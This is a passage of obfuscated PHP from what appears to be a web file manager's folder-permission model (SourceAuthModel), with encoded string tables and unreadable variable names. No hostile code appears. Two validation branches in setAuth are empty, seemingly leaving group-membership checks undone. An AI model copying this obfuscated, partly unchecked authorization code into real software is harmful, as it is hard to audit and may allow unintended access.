Model($Ô÷»çë[2186])->where($ÉşŞÂ±)->save($Åß…™£); if ($Õ–Ü²ßÄ[$Ô÷»çë[835]] == $Ô÷»çë[512]) { if ($ÎÅ”¡Ö„[$Ô÷»çë[545]] != $Ô÷»çë[231] && $this->shareFileMeta($ÎÅ”¡Ö„[$Ô÷»çë[545]])) { $this->shareFileMeta($ÎÅ”¡Ö„[$Ô÷»çë[545]], 0); } $this->remove($ÎÅ”¡Ö„[$Ô÷»çë[672]]); return !0; } if ($Ùú’®ã° && $Õ–Ü²ßÄ[$Ô÷»çë[835]] == $Ô÷»çë[2191]) { $õÉ¶†­ı = $Åß…™£[$Ô÷»çë[835]] == $Ô÷»çë[2191] ? 1 : 0; $this->shareFileMeta($ÎÅ”¡Ö„[$Ô÷»çë[545]], $õÉ¶†­ı); $this->removeByFile($ÎÅ”¡Ö„[$Ô÷»çë[545]]); } return $Ùú’®ã°; } private function removeByFile($˜´Ö”èÃ) { $Üú­ã–± =& $_SERVER[¯‘·½]; $˜Ÿà·é = Model($Üú­ã–±[916])->where(array($Üú­ã–±[545] => $˜´Ö”èÃ))->field($Üú­ã–±[194])->select(); $ÁğÌ¢º = array_to_keyvalue($˜Ÿà·é, $Üú­ã–±[12], $Üú­ã–±[194]); $óıõŠÜ = array($Üú­ã–±[194] => array($Üú­ã–±[7], $ÁğÌ¢º), $Üú­ã–±[566] => 1); $˜Ÿà·é = $this->where($óıõŠÜ)->field($Üú­ã–±[672])->select(); if (empty($˜Ÿà·é)) { return; } $•µ¶¤ = array_to_keyvalue($˜Ÿà·é, $Üú­ã–±[12], $Üú­ã–±[672]); $this->remove($•µ¶¤); } private function shareFileMeta($©»®Ÿ£¡, $Ÿ½Œ™çŸ = null) { $İ±€…äÇ =& $_SERVER[¯‘·½]; $¯şÃÉş = array($İ±€…äÇ[545] => $©»®Ÿ£¡, $İ±€…äÇ[97] => $İ±€…äÇ[2196]); if (is_null($Ÿ½Œ™çŸ)) { return Model($İ±€…äÇ[2197])->where($¯şÃÉş)->find(); } $¯şÃÉş[$İ±€…äÇ[452]] = $Ÿ½Œ™çŸ; Model($İ±€…äÇ[2197])->add($¯şÃÉş, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\141\165\164\x68"; public function getAuth($äÚ³êÈ¯) { $¨ˆ¤şÂ¬ =& $_SERVER[¯‘·½]; $ÆÕüî˜ø = $this->sourceAuthSelect($äÚ³êÈ¯); $çş“Œ¸ = array(); $²ö×§Òİ = array(); $—¶À¾“á = 2 << 25; foreach ($ÆÕüî˜ø as $Ì•¦­–…) { $‹ÅÈªü· = Model($¨ˆ¤şÂ¬[575])->listData($Ì•¦­–…[$¨ˆ¤şÂ¬[2115]]); if (!$‹ÅÈªü·) { continue; } $çş“Œ¸[] = $Ì•¦­–…; $§ä¸øÊõ = 0; if ($Ì•¦­–…[$¨ˆ¤şÂ¬[191]] == SourceModel::TYPE_GROUP) { $§ä¸øÊõ = $—¶À¾“á * 2; } if ($Ì•¦­–…[$¨ˆ¤şÂ¬[191]] == SourceModel::TYPE_USER) { $§ä¸øÊõ = $—¶À¾“á; } if ($Ì•¦­–…[$¨ˆ¤şÂ¬[191]] == SourceModel::TYPE_USER && $Ì•¦­–…[$¨ˆ¤şÂ¬[573]] == $¨ˆ¤şÂ¬[231]) { $§ä¸øÊõ = 0; } $²ö×§Òİ[] = $‹ÅÈªü·[$¨ˆ¤şÂ¬[489]] + $§ä¸øÊõ; } array_multisort($²ö×§Òİ, SORT_DESC, $çş“Œ¸); return $çş“Œ¸; } public function sourceAuthSelect($˜½ÑÇàÇ) { $œ¬Ô¾£ =& $_SERVER[¯‘·½]; static $ËêÁİÓÚ = array(); $ÀıàèÛ = is_array($˜½ÑÇàÇ) ? !1 : !0; if ($ÀıàèÛ) { $˜½ÑÇàÇ = array($˜½ÑÇàÇ); } $ãÍË“—² = array(); foreach ($˜½ÑÇàÇ as $å†Å¨ø‰) { if (isset($ËêÁİÓÚ[$å†Å¨ø‰])) { $ãÍË“—²[$å†Å¨ø‰] = $ËêÁİÓÚ[$å†Å¨ø‰]; } } if (count($ãÍË“—²) == count($˜½ÑÇàÇ)) { return $ÀıàèÛ ? $ãÍË“—²[$˜½ÑÇàÇ[0]] : $ãÍË“—²; } $‘Á‹Ê · = $œ¬Ô¾£[2198]; $ àş‹»– = array($œ¬Ô¾£[194] => array($œ¬Ô¾£[7], $˜½ÑÇàÇ)); $ŒŒ‹ıš = $this->field($‘Á‹Ê ·)->order($œ¬Ô¾£[477])->where($ àş‹»–)->select(); $±Í§úç¨ = array_to_keyvalue_group($ŒŒ‹ıš, $œ¬Ô¾£[194]); foreach ($˜½ÑÇàÇ as $å†Å¨ø‰) { $ËêÁİÓÚ[$å†Å¨ø‰] = $±Í§úç¨[$å†Å¨ø‰] ? $±Í§úç¨[$å†Å¨ø‰] : array(); } if ($ÀıàèÛ) { return $ŒŒ‹ıš; } return $±Í§úç¨; } public function setAuth($ä½•Ù, $¿Çúûêç) { $½Ä§Ğç =& $_SERVER[¯‘·½]; $ôãµåÄ’ = Model($½Ä§Ğç[1452])->sourceInfo($ä½•Ù); if (!$ôãµåÄ’) { return !1; } if ($ôãµåÄ’[$½Ä§Ğç[191]] != SourceModel::TYPE_GROUP) { return !1; } $¸Òö¸£ã = 1; $şö¿Çáô = $ôãµåÄ’[$½Ä§Ğç[573]]; if ($şö¿Çáô != $¸Òö¸£ã) { $¦•ÀßÒŠ = array($½Ä§Ğç[1414] => $şö¿Çáô); $ƒ›Ü¥Õ = Model($½Ä§Ğç[2101])->field($½Ä§Ğç[1806])->where($¦•ÀßÒŠ)->select(); $ƒ›Ü¥Õ = array_to_keyvalue($ƒ›Ü¥Õ, $½Ä§Ğç[12], $½Ä§Ğç[1806]); } $¦‚ÁıŒÉ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÓŒ’÷Ï = array(); foreach ($¿Çúûêç as $ô˜¤ù) { if (!in_array($ô˜¤ù[$½Ä§Ğç[191]], $¦‚ÁıŒÉ)) { show_json(LNG($½Ä§Ğç[2199]), !1); } if ($şö¿Çáô != $¸Òö¸£ã) { if ($ô˜¤ù[$½Ä§Ğç[191]] == SourceModel::TYPE_GROUP) { } if ($ô˜¤ù[$½Ä§Ğç[573]] != 0 && !in_array($ô˜¤ù[$½Ä§Ğç[573]], $ƒ›Ü¥Õ)) { } } if ($ô˜¤ù[$½Ä§Ğç[573]] == 0) { $ô˜¤ù[$½Ä§Ğç[191]] = SourceModel::TYPE_USER; } $ÓŒ’÷Ï[] = array($½Ä§Ğç[194] => $ä½•Ù, $½Ä§Ğç[191] => intval($ô˜¤ù[$½Ä§Ğç[191]]), $½Ä§Ğç[573] => intval($ô˜¤ù[$½Ä§Ğç[573]]), $½Ä§Ğç[2115] => intval($ô˜¤ù[$½Ä§Ğç[2115]]) ? intval($ô˜¤ù[$½Ä§Ğç[2115]]) : 0, $½Ä§Ğç[2178] => intval($ô˜¤ù[$½Ä§Ğç[2178]]) ? intval($ô˜¤ù[$½Ä§Ğç[2178]]) : -1); } $this->where(array($½Ä§Ğç[493] => $ä½•Ù))->delete(); $this->addAll($ÓŒ’÷Ï); return !0; } public function authClear($­Ù«¹ÑÃ) { $ô¾©ØÏÚ =& $_SERVER[¯‘·½]; $•ÕøÕ‰© = Model($ô¾©ØÏÚ[1452])->sourceInfo($­Ù«¹ÑÃ); $Á²ß´³ = array($­Ù«¹ÑÃ); if ($•ÕøÕ‰©[$ô¾©ØÏÚ[487]] == $ô¾©ØÏÚ[91]) { $ØÍÍ²å² = array($ô¾©ØÏÚ[659] => array($ô¾©ØÏÚ[619], $•ÕøÕ‰©[$ô¾©ØÏÚ[588]] . $­Ù«¹ÑÃ . $ô¾©ØÏÚ[620])); $Á²ß´³ = Model($ô¾©ØÏÚ[1452])->field($ô¾©ØÏÚ[493])->where($ØÍÍ²å²)->getField($ô¾©ØÏÚ[194], !0); $Á²ß´³[] = $­Ù«¹ÑÃ; } $this->where(array($ô¾©ØÏÚ[493] => array($ô¾©ØÏÚ[494], $Á²ß´³)))->delete(); return !0; } public function getAllChildren($š°éÏ») { $ĞÅª©İ¸ =& $_SERVER[¯‘·½]; $Ğ½ÚóÔÉ = Model($ĞÅª©İ¸[1452])->sourceInfo($š°éÏ»); if ($Ğ½ÚóÔÉ[$ĞÅª©İ¸[487]] != $ĞÅª©İ¸[91]) { return $this->sourceListAuth(array($š°éÏ»)); } if ($Ğ½ÚóÔÉ[$ĞÅª©İ¸[191]] != SourceModel::TYPE_GROUP) { return array(); } $”œïàâ† = 1; $ªÏíóè¨ = array($š°éÏ»); if ($Ğ½ÚóÔÉ[$ĞÅª©İ¸[193]] == $ĞÅª©İ¸[231] && $Ğ½ÚóÔÉ[$ĞÅª©İ¸[573]] != $”œïàâ†) { $ªÏíóè¨ = $this->groupChidldAllRootSource($Ğ½ÚóÔÉ[$ĞÅª©İ¸[573]]); } $Õò±Æ¼ë = $this->field($ĞÅª©İ¸[194])->group($ĞÅª©İ¸[194])->select(); $Õò±Æ¼ë = array_to_keyvalue($Õò±Æ¼ë, $ĞÅª©İ¸[12], $ĞÅª©İ¸[194]); if (!$Õò±Æ¼ë) { return array(); } $Äà¬ñäÃ = $ĞÅª©İ¸[2200]; $†¶úœÇ = array($ĞÅª©İ¸[194] => array($ĞÅª©İ¸[7], $Õò±Æ¼ë), $ĞÅª©İ¸[507] => $ĞÅª©İ¸[231]); $š™§Íí = Model($ĞÅª©İ¸[916])->field($Äà¬ñäÃ)->where($†¶úœÇ)->select(); $åİ´—Ìµ = array($š°éÏ»); foreach ($š™§Íí as $¯Ç×–Ìí) { foreach ($ªÏíóè¨ as $š›ã³Üµ) { $ôŞ±ú½ = $ĞÅª©İ¸[50] . $š›ã³Üµ . $ĞÅª©İ¸[50]; $âôó“ş = $¯Ç×–Ìí[$ĞÅª©İ¸[588]] . $¯Ç×–Ìí[$ĞÅª©İ¸[194]] . $ĞÅª©İ¸[50]; if (strstr($âôó“ş, $ôŞ±ú½)) { $åİ´—Ìµ[] = $¯Ç×–Ìí[$ĞÅª©İ¸[194]]; break; } } } return $this->sourceListAuth($åİ´—Ìµ); } private function sourceListAuth($í±÷ ˜ˆ) { $»Å½Å× =& $_SERVER[¯‘·½]; $”Èª•ñ = Model($»Å½Å×[1452])->sourceListInfo($í±÷ ˜ˆ, !0); $øï†÷¼Ù = $this->sourceAuthSelect($í±÷ ˜ˆ); $øşö§È‰ = array(); $³¬Ú¢ùä = array(); foreach ($”Èª•ñ as $Ê‰¾ƒÛö) { unset($Ê‰¾ƒÛö[$»Å½Å×[531]]); unset($Ê‰¾ƒÛö[$»Å½Å×[529]]); unset($Ê‰¾ƒÛö[$»Å½Å×[489]]); unset($Ê‰¾ƒÛö[$»Å½Å×[90]]); $¥ÈÂĞÊø = $øï†÷¼Ù[$Ê‰¾ƒÛö[$»Å½Å×[194]]]; if (!$¥ÈÂĞÊø) { continue; } $Ê‰¾ƒÛö[$»Å½Å×[2201]] = $this->authTargetInfo($¥ÈÂĞÊø); $Ê‰¾ƒÛö[$»Å½Å×[586]] = rtrim($Ê‰¾ƒÛö[$»Å½Å×[592]], $»Å½Å×[8]) . $»Å½Å×[8] . ltrim($Ê‰¾ƒÛö[$»Å½Å×[586]], $»Å½Å×[8]); $øşö§È‰[] = $Ê‰¾ƒÛö; $ĞÓ×©· = count(explode($»Å½Å×[8], trim($Ê‰¾ƒÛö[$»Å½Å×[586]], $»Å½Å×[8]))); $³¬Ú¢ùä[] = $ĞÓ×©· + ($Ê‰¾ƒÛö[$»Å½Å×[33]] == $»Å½Å×[78] ? 0 : 1000); } array_multisort($³¬Ú¢ùä, SORT_ASC, $øşö§È‰); return $øşö§È‰; } private function groupChidldAllRootSource($ÖİÖóÛ) { $òéœïí‘ =& $_SERVER[¯‘·½]; $’Æ½»· = Model($òéœïí‘[1412])->groupChildrenAll($ÖİÖóÛ); $Ÿ˜½³Öû = array($òéœïí‘[193] => 0, $òéœïí‘[573] => array($òéœïí‘[7], $’Æ½»·), $òéœïí‘[191] => SourceModel::TYPE_GROUP); $ËİÇÄ ï = Model($òéœïí‘[916])->field($òéœïí‘[194])->where($Ÿ˜½³Öû)->select(); $ËİÇÄ ï = array_to_keyvalue($ËİÇÄ ï, $òéœïí‘[12], $òéœïí‘[194]); return $ËİÇÄ ï; } private function authTargetInfo($±í›Ã‚ ) { $¹í³Òú£ =& $_SERVER[¯‘·½]; $×Ü‘¸æË = array(); $¯µåöºÈ = array(); $¡®—Åå = 2 << 25; foreach ($±í›Ã‚  as $ÚğÊÂÑ™) { $è‘şÌğ = Model($¹í³Òú£[575])->listData($ÚğÊÂÑ™[$¹í³Òú£[2115]]); if (!$è‘şÌğ) { continue; } if ($ÚğÊÂÑ™[$¹í³Òú£[191]] == SourceModel::TYPE_USER) { $Á›àÅçğ = Model($¹í³Òú£[581])->getInfoSimpleOuter($ÚğÊÂÑ™[$¹í³Òú£[573]]); if ($Á›àÅçğ[$¹í³Òú£[1806]] == $¹í³Òú£[1297]) { continue; } if ($Á›àÅçğ[$¹í³Òú£[1806]] == $¹í³Òú£[231]) { $Á›àÅçğ[$¹í³Òú£[32]] = LNG($¹í³Òú£[2202]); } } else { $Á›àÅçğ = Model($¹í³Òú£[589])->getInfoSimple($ÚğÊÂÑ™[$¹í³Òú£[573]]); } if (!$Á›àÅçğ) { continue; } $Á›àÅçğ[$¹í³Òú£[544]] = $è‘şÌğ; $×Ü‘¸æË[] = $Á›àÅçğ; $Ş÷Ê®òå = 0; if ($ÚğÊÂÑ™[$¹í³Òú£[191]] == SourceModel::TYPE_GROUP) { $Ş÷Ê®òå = $¡®—Åå * 2; } if ($ÚğÊÂÑ™[$¹í³Òú£[191]] == SourceModel::TYPE_USER) { $Ş÷Ê®òå = $¡®—Åå; } if ($ÚğÊÂÑ™[$¹í³Òú£[191]] == SourceModel::TYPE_USER && $ÚğÊÂÑ™[$¹í³Òú£[573]] == $¹í³Òú£[231]) { $Ş÷Ê®òå = 0; } $¯µåöºÈ[] = $è‘şÌğ[$¹í³Òú£[489]] + $Ş÷Ê®òå; } array_multisort($¯µåöºÈ, SORT_DESC, $×Ü‘¸æË); return $×Ü‘¸æË; } public function getAllChildrenByUser($ûººøØû, $ß´­ÀÇÏ) { $Ìäğ©ƒ´ =& $_SERVER[¯‘·½]; $²¼´††¾ = Model($Ìäğ©ƒ´[601])->getInfo($ß´­ÀÇÏ); if (!$ß´­ÀÇÏ || !$ûººøØû || !$²¼´††¾) { return array(); } $ÚğëØ–Ş = Model($Ìäğ©ƒ´[1452])->sourceInfo($ûººøØû); $Ô‹ÜÒ€Î = array(); $ïõ±òíË = 1; if ($ÚğëØ–Ş[$Ìäğ©ƒ´[193]] == $Ìäğ©ƒ´[231] && $ÚğëØ–Ş[$Ìäğ©ƒ´[573]] != $ïõ±òíË && $this->groupContainUser($ÚğëØ–Ş[$Ìäğ©ƒ´[573]], $ß´­ÀÇÏ)) { foreach ($²¼´††¾[$Ìäğ©ƒ´[1413]] as $Üğš¦Öª) { $¸Ş¹Î Ü = Model($Ìäğ©ƒ´[589])->getInfo($Üğš¦Öª[$Ìäğ©ƒ´[1414]]); $æ¸ÜÉ¨ = Model($Ìäğ©ƒ´[601])->getInfoSimpleOuter($ß´­ÀÇÏ); $æ¸ÜÉ¨[$Ìäğ©ƒ´[544]] = $Üğš¦Öª[$Ìäğ©ƒ´[489]]; if (Model($Ìäğ©ƒ´[575])->authCheckAction($Üğš¦Öª[$Ìäğ©ƒ´[489]][$Ìäğ©ƒ´[489]], $Ìäğ©ƒ´[2027])) { continue; } $º€æèéÛ = array($Ìäğ©ƒ´[32] => $Ìäğ©ƒ´[1317] . $¸Ş¹Î Ü[$Ìäğ©ƒ´[32]], $Ìäğ©ƒ´[194] => $¸Ş¹Î Ü[$Ìäğ©ƒ´[90]][$Ìäğ©ƒ´[194]], $Ìäğ©ƒ´[87] => KodIO::make($¸Ş¹Î Ü[$Ìäğ©ƒ´[90]][$Ìäğ©ƒ´[194]]), $Ìäğ©ƒ´[193] => $Ìäğ©ƒ´[231], $Ìäğ©ƒ´[191] => $Ìäğ©ƒ´[582], $Ìäğ©ƒ´[33] => $Ìäğ©ƒ´[623], $Ìäğ©ƒ´[586] => $¸Ş¹Î Ü[$Ìäğ©ƒ´[593]], $Ìäğ©ƒ´[1414] => $¸Ş¹Î Ü[$Ìäğ©ƒ´[1414]], $Ìäğ©ƒ´[590] => $¸Ş¹Î Ü[$Ìäğ©ƒ´[193]], $Ìäğ©ƒ´[2201] => array($æ¸ÜÉ¨)); $Ô‹ÜÒ€Î[$º€æèéÛ[$Ìäğ©ƒ´[194]]] = $º€æèéÛ; } } $¥²ùÆØ = array(); $®Ä¹Á’Ä = $this->getAllChildren($ûººøØû); foreach ($®Ä¹Á’Ä as $ëèË±®) { $áã€‹é© = !1; foreach ($ëèË±®[$Ìäğ©ƒ´[2201]] as $ŞØÆøŞı) { if ($ŞØÆøŞı[$Ìäğ©ƒ´[1806]]) { if ($ŞØÆøŞı[$Ìäğ©ƒ´[1806]] == $ß´­ÀÇÏ) { $áã€‹é© = !0; break; } } if ($ŞØÆøŞı[$Ìäğ©ƒ´[1414]]) { if ($this->groupContainUser($ŞØÆøŞı[$Ìäğ©ƒ´[1414]], $ß´­ÀÇÏ)) { $áã€‹é© = !0; break; } } } if ($áã€‹é©) { $¥²ùÆØ[] = $ëèË±®; } $à¼ ¬¡ñ = $ëèË±®[$Ìäğ©ƒ´[194]]; if (isset($Ô‹ÜÒ€Î[$à¼ ¬¡ñ])) { $ëèË±®[$Ìäğ©ƒ´[2201]][] = $Ô‹ÜÒ€Î[$à¼ ¬¡ñ][0]; $Ô‹ÜÒ€Î[$à¼ ¬¡ñ] = !1; } } $Ô‹ÜÒ€Î = array_filter(array_values($Ô‹ÜÒ€Î)); $¥²ùÆØ = array_merge($Ô‹ÜÒ€Î, $¥²ùÆØ); return $¥²ùÆØ; } public function setAllChildrenByUser($’¨ÇâØı, $Æ… ¦¤, $Õİ˜¾Î) { $İ‚´«ç˜ =& $_SERVER[¯‘·½]; $••Òáı = $this->getAllChildrenByUser($’¨ÇâØı, $Æ… ¦¤); if (!$Õİ˜¾Î || !$••Òáı) { return !1; } foreach ($••Òáı as $²É—ã³) { $àÅâıÉ = array(); foreach ($²É—ã³[$İ‚´«ç˜[2201]] as $ØÏ¹¡£ş) { $±ÔºîÂ´ = $ØÏ¹¡£ş[$İ‚´«ç˜[544]]; $ÌÃÆÆ  = $ØÏ¹¡£ş[$İ‚´«ç˜[1806]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ºøİÙ‰ø = $ØÏ¹¡£ş[$İ‚´«ç˜[1806]] ? $ØÏ¹¡£ş[$İ‚´«ç˜[1806]] : $ØÏ¹¡£ş[$İ‚´«ç˜[1414]]; if ($ØÏ¹¡£ş[$İ‚´«ç˜[1806]] && $ØÏ¹¡£ş[$İ‚´«ç˜[1806]] == $Æ… ¦¤) { continue; } $àÅâıÉ[] = array($İ‚´«ç˜[194] => $²É—ã³[$İ‚´«ç˜[194]], $İ‚´«ç˜[191] => $ÌÃÆÆ , $İ‚´«ç˜[573] => intval($ºøİÙ‰ø), $İ‚´«ç˜[2115] => isset($±ÔºîÂ´[$İ‚´«ç˜[477]]) ? intval($±ÔºîÂ´[$İ‚´«ç˜[477]]) : 0, $İ‚´«ç˜[2178] => isset($±ÔºîÂ´[$İ‚´«ç˜[2178]]) ? intval($±ÔºîÂ´[$İ‚´«ç˜[2178]]) : -1); } $àÅâıÉ[] = array($İ‚´«ç˜[194] => $²É—ã³[$İ‚´«ç˜[194]], $İ‚´«ç˜[191] => SourceModel::TYPE_USER, $İ‚´«ç˜[573] => intval($Æ… ¦¤), $İ‚´«ç˜[2115] => intval($Õİ˜¾Î), $İ‚´«ç˜[2178] => -1); $this->where(array($İ‚´«ç˜[493] => $²É—ã³[$İ‚´«ç˜[194]]))->delete(); $this->addAll($àÅâıÉ); } return !0; } public function get($…İ‘±›—) { $„Õô¶Ç = $this->getSourceList(array($…İ‘±›—), !0); return $„Õô¶Ç[0]; } public function getSourceList($Š‘òˆ–, $Ì®¸¯€Â = false, $ş¹ğ–  = false) { $é²û°¨ =& $_SERVER[¯‘·½]; if (!$Š‘òˆ–) { return array(); } $ôó¸ó§ = Model($é²û°¨[1452]); if (!$Ì®¸¯€Â && count($Š‘òˆ–) == 1) { $Ì®¸¯€Â = array(); $Ì®¸¯€Â[$Š‘òˆ–[0]] = $ôó¸ó§->sourceInfo($Š‘òˆ–[0]); } if (!$Ì®¸¯€Â) { $ä–Ã¨ÒÍ = array($é²û°¨[493] => array($é²û°¨[494], $Š‘òˆ–)); $Ì®¸¯€Â = $ôó¸ó§->field($é²û°¨[2203])->where($ä–Ã¨ÒÍ)->select(); $Ì®¸¯€Â = array_to_keyvalue($Ì®¸¯€Â, $é²û°¨[194]); } $±™Àôœ = $Š‘òˆ–; foreach ($Ì®¸¯€Â as $‹¤­‘ğ  => $ÈÂğ…¾) { $½‘ìË = $ôó¸ó§->parentLevelArray($ÈÂğ…¾[$é²û°¨[588]]); $±™Àôœ = array_merge($±™Àôœ, array(intval($‹¤­‘ğ )), array_reverse($½‘ìË)); } $±™Àôœ = array_values(array_unique($±™Àôœ)); if (!$±™Àôœ) { return array(); } $‚ı¤ş÷Ú = $this->sourceAuthSelect($±™Àôœ); $®ê²Öƒ» = array(); foreach ($±™Àôœ as $åæÇ×÷ı) { if (isset($‚ı¤ş÷Ú[$åæÇ×÷ı])) { $®ê²Öƒ»[$åæÇ×÷ı] = $‚ı¤ş÷Ú[$åæÇ×÷ı]; } } $½š˜…ò÷ = $this->userIsRoot($ş¹ğ– ); $¿–¥İ¤Á = AuthModel::authAll(); $¾µ‡£Í = array($é²û°¨[490] => $¿–¥İ¤Á, $é²û°¨[2204] => array($é²û°¨[495] => 0, $é²û°¨[2012] => $¿–¥İ¤Á, $é²û°¨[496] => LNG($é²û°¨[2205]), $é²û°¨[2029] => $é²û°¨[2206])); $´¹–ş¶ò = array(); foreach ($Ì®¸¯€Â as $åæÇ×÷ı => $²Ü ¦§û) { if ($½š˜…ò÷ && $GLOBALS[$é²û°¨[6]][$é²û°¨[2025]]) { $´¹–ş¶ò[$åæÇ×÷ı] = $¾µ‡£Í; continue; } $´¹–ş¶ò[$åæÇ×÷ı] = $this->makeSourceAuth($²Ü ¦§û, $®ê²Öƒ», $ş¹ğ– ); } return $´¹–ş¶ò; } public function authDeepCheck($Í”åß, $óÛ÷•¡Ö = false) { $ÁáóÍãù =& $_SERVER[¯‘·½]; $óÛ÷•¡Ö = $óÛ÷•¡Ö ? $óÛ÷•¡Ö : USER_ID; $ª»µ±ıø = $this->makeAuthDeep($óÛ÷•¡Ö); if (!in_array($Í”åß, $ª»µ±ıø[$ÁáóÍãù[2207]])) { return !1; } $Ì¢ğâø— = array(); foreach ($ª»µ±ıø[$ÁáóÍãù[2208]] as $ñ©‹ÍÜ => $Íğ´«Éœ) { if (!in_array($Í”åß, $Íğ´«Éœ)) { continue; } $Ì¢ğâø—[] = $ñ©‹ÍÜ; } if (!$Ì¢ğâø—) { return !1; } $èÑ·ıÌì = $Ì¢ğâø— ? $Ì¢ğâø—[0] : $Í”åß; return array($ÁáóÍãù[490] => -1, $ÁáóÍãù[544] => array($ÁáóÍãù[495] => $ÁáóÍãù[1297], $ÁáóÍãù[2012] => $ÁáóÍãù[231], $ÁáóÍãù[496] => LNG($ÁáóÍãù[2209]), $ÁáóÍãù[2029] => $ÁáóÍãù[2210]), $ÁáóÍãù[2211] => LNG($ÁáóÍãù[2212]), $ÁáóÍãù[2213] => $this->sourceAuthInfo($èÑ·ıÌì)); } protected function makeAuthDeep($¤á«½ÊØ = false) { $øÆŒŸˆ =& $_SERVER[¯‘·½]; static $¼óçùƒ‡ = array(); $¤á«½ÊØ = $¤á«½ÊØ ? $¤á«½ÊØ : USER_ID; if (isset($¼óçùƒ‡[$¤á«½ÊØ])) { return $¼óçùƒ‡[$¤á«½ÊØ]; } $·™šÆç = Model($øÆŒŸˆ[2214])->listData(); $Ú“ãœÊ¨ = array(); foreach ($·™šÆç as $œ•îèÂÖ) { if ($œ•îèÂÖ[$øÆŒŸˆ[489]] == 0 && $œ•îèÂÖ[$øÆŒŸˆ[2028]] == $øÆŒŸˆ[91]) { $Ú“ãœÊ¨[] = $œ•îèÂÖ[$øÆŒŸˆ[477]]; } } $ß­˜à£” = $this->userGroupParents($¤á«½ÊØ); $ÜíŒÅ¦´ = array($øÆŒŸˆ[191] => SourceModel::TYPE_USER, $øÆŒŸˆ[573] => $¤á«½ÊØ); if ($ß­˜à£”) { $ÜíŒÅ¦´ = array(array($øÆŒŸˆ[191] => SourceModel::TYPE_USER, $øÆŒŸˆ[573] => $¤á«½ÊØ), array($øÆŒŸˆ[191] => SourceModel::TYPE_GROUP, $øÆŒŸˆ[573] => array($øÆŒŸˆ[494], $ß­˜à£”)), $øÆŒŸˆ[1096] => $øÆŒŸˆ[2109]); } $Î¹²ê» = $this->field($øÆŒŸˆ[2215])->where($ÜíŒÅ¦´)->select(); $Ùùˆ = array(); $èÙÚÉ«ü = array_to_keyvalue_group($Î¹²ê», $øÆŒŸˆ[194]); foreach ($èÙÚÉ«ü as $—Åú¥³ => $Ûç”òÒÂ) { $®Ñ²Á÷å = $this->authArrayCheck($Ûç”òÒÂ, $¤á«½ÊØ); if ($®Ñ²Á÷å[$øÆŒŸˆ[490]] > 0) { $Ùùˆ[] = $—Åú¥³ . $øÆŒŸˆ[12]; } } if ($ß­˜à£”) { $û·¿Ïæ” = Model($øÆŒŸˆ[589]); foreach ($ß­˜à£” as $¥ı¿Ğø™) { $Ç•ãØ»Ä = $û·¿Ïæ”->getInfo($¥ı¿Ğø™); if (!$Ç•ãØ»Ä || !is_array($Ç•ãØ»Ä[$øÆŒŸˆ[90]])) { continue; } $Ùùˆ[] = $Ç•ãØ»Ä[$øÆŒŸˆ[90]][$øÆŒŸˆ[194]]; } } $¹åòØªˆ = array(); $ôº™À£µ = $ß­˜à£”; $­üâŞ‚ = Model($øÆŒŸˆ[1452]); $û·¿Ïæ” = Model($øÆŒŸˆ[589]); $—òš±È = array(); $÷âå®Ú¯ = array(); $ğüâë = array(); $ÅÄ™ÜÏ¬ = array(); if ($Ùùˆ) { $ıêÉùË¨ = $­üâŞ‚->where(array($øÆŒŸˆ[194] => array($øÆŒŸˆ[494], $Ùùˆ)))->select(); foreach ($ıêÉùË¨ as $¡ë©¦‡İ) { if ($¡ë©¦‡İ[$øÆŒŸˆ[507]] == $øÆŒŸˆ[91]) { continue; } $êëÅá¾„ = $­üâŞ‚->parentLevelArray($¡ë©¦‡İ[$øÆŒŸˆ[588]]); $¹åòØªˆ = array_merge($¹åòØªˆ, $êëÅá¾„); $ôº™À£µ[] = $¡ë©¦‡İ[$øÆŒŸˆ[573]]; $—òš±È[$¡ë©¦‡İ[$øÆŒŸˆ[194]]] = $êëÅá¾„; $÷âå®Ú¯[$¡ë©¦‡İ[$øÆŒŸˆ[194]]] = $¡ë©¦‡İ[$øÆŒŸˆ[573]]; } } $ôº™À£µ = array_values(array_unique($ôº™À£µ)); $İ«åãÃš = $ôº™À£µ; foreach ($İ«åãÃš as $¥ı¿Ğø™) { $Ç•ãØ»Ä = $û·¿Ïæ”->getInfo($¥ı¿Ğø™); $êëÅá¾„ = $­üâŞ‚->parentLevelArray($Ç•ãØ»Ä[$øÆŒŸˆ[588]]); $ôº™À£µ = array_merge($ôº™À£µ, $êëÅá¾„); } $ôº™À£µ = array_values(array_unique($ôº™À£µ)); foreach ($ôº™À£µ as $¥ı¿Ğø™) { $Ç•ãØ»Ä = $û·¿Ïæ”->getInfo($¥ı¿Ğø™); $¹åòØªˆ[] = $Ç•ãØ»Ä[$øÆŒŸˆ[90]][$øÆŒŸˆ[194]]; $ğüâë[$¥ı¿Ğø™] = $Ç•ãØ»Ä[$øÆŒŸˆ[90]][$øÆŒŸˆ[194]]; $ÅÄ™ÜÏ¬[$¥ı¿Ğø™] = $­üâŞ‚->parentLevelArray($Ç•ãØ»Ä[$øÆŒŸˆ[588]]); } foreach ($—òš±È as $§ÎõÅ³Œ => $×åí¹í×) { $Éâğò = $÷âå®Ú¯[$§ÎõÅ³Œ]; if (!$Éâğò || !$ğüâë[$Éâğò]) { continue; } $¥ˆûÛÃ = array(); foreach ($ÅÄ™ÜÏ¬[$Éâğò] as $¥ı¿Ğø™) { $¥ˆûÛÃ[] = $ğüâë[$¥ı¿Ğø™]; } $—òš±È[$§ÎõÅ³Œ] = array_merge($¥ˆûÛÃ, $×åí¹í×); } $¹åòØªˆ = array_values(array_unique($¹åòØªˆ)); $¢Ú¢ãÚ® = array($øÆŒŸˆ[2207] => $¹åòØªˆ, $øÆŒŸˆ[2208] => $—òš±È); $¼óçùƒ‡[$¤á«½ÊØ] = $¢Ú¢ãÚ®; return $¢Ú¢ãÚ®; } private function makeSourceAuth($‚Õ‰ÛØõ, $«çê¨À, $ı÷«‹µû = false) { $ñĞâ¢¤ =& $_SERVER[¯‘·½]; $ğ¸œ“…á = $ñĞâ¢¤[91]; $Èò³‡²÷ = $‚Õ‰ÛØõ[$ñĞâ¢¤[573]]; $œ£”Óë— = $‚Õ‰ÛØõ[$ñĞâ¢¤[191]] == SourceModel::TYPE_GROUP; $‘ÇÎ×Í¡ = $œ£”Óë— ? $this->groupRootAuth($Èò³‡²÷, $ı÷«‹µû) : !1; if ($‘ÇÎ×Í¡ && 